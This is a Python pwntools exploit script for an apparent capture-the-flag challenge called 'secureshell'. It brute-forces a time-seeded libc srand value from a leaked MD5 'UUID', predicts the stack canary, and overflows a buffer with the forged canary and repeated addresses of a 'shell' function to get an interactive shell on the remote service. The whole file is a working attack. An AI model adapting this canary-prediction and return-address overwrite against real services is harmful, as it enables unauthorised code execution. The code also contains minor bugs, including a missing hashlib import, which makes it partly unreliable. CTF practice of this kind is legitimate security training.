from pwn import *
from ctypes import *
import time

TARGET = './test'
HOST = 'secureshell.wpictf.xyz'
PORT = 31339

seed_time = time.time()
# r = process(TARGET)
r = remote(HOST, PORT)
LIBC = cdll.LoadLibrary('libc-2.27.so')

gdb.attach(r, '''
set disable-randomization on
b*0x4012b0
b*0x401365
c
''')
elf = ELF(TARGET)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

def search_seed(str_md5):
    true_md5 = ''
    for i in range(14, -2, -2):
        true_md5 += str_md5[i:i+2]
    for i in range(14, -2, -2):
        true_md5 += str_md5[16+i:16+i+2]
    print "display:", str_md5
    print "true_md5:", true_md5
    search_range_seed1 = 0x4
    search_range_seed2 = 0xfffff
    for i in range(search_range_seed1):
        seed1 = int(seed_time) - search_range_seed1 / 2 + i
        for j in range(search_range_seed2):
            seed2 = int((seed_time - seed1) * 1000000)
            seed2 = seed2 - search_range_seed2 / 2 + j
            # print i, j, hex(seed1), hex(seed2)
 
            true_seed = ((seed1 * 0xf4240) & 0xffffffff) + seed2
            LIBC.srand(true_seed) 
            canary1 = LIBC.rand()
            canary2 = LIBC.rand()
            uuid_seed = LIBC.rand()
            md5 = hashlib.md5()
            md5.update(p32(uuid_seed))
            # print md5.hexdigest(), true_md5
            if (md5.hexdigest() == true_md5): 
                return true_seed
    print "Error: not found"
    exit()

r.recvuntil('password')

payload = ''
payload += 'something'
r.sendline(payload) 

r.recvuntil('UUID: ') 
uuid = r.recvuntil('\n')[:-1]
print "UUID:", uuid

r.recvuntil('password')
seed = search_seed(uuid)
dbg("seed")
canary1 = LIBC.rand()
canary2 = LIBC.rand()
canary = canary1 << 32 | canary2

payload = ''
payload += 'A' * 112
payload += p64(canary)
payload += p64(elf.sym['shell'])
payload += p64(elf.sym['shell'])
payload += p64(elf.sym['shell'])
payload += p64(elf.sym['shell'])
r.sendline(payload) 

r.interactive()
r.close()
